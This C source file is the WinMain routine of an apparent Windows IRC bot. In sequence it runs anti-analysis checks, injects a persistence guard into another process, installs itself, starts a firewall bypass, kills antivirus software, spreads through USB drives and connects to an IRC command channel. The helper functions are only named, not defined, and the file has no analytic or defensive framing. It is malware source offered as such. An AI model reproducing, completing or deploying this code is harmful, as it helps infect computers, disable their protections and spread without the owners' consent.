#include "wALL.h"
#include "wConfig.h"
SOCKET sock;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
{
	char		currentfile[MAX_PATH] = {0},
				destination[MAX_PATH] = {0};
	
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	Sleep(400);

	Detect_Anti();

	//Presistance
	if(_inject) {
   DWORD dwPID;
   if(Check(cfg_filename)) {
      dwPID = GetPID(cfg_filename);
      Inject(dwPID, (LPTHREAD_START_ROUTINE)Guard, NULL);
   }
	}

    //mutex-check
	HANDLE xetum;
	xetum = CreateMutex(NULL, FALSE, cfg_mutex);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);
 
    //install
    BotInstall();

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Firewall_Bypass, 0, 0, 0);
	AntivirusKiller();
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)USB_Spreader, 0, 0, 0);
	//connect
	char test[1] = "";
	IRC_Thread((void*)test);
 
	return 0;
}
//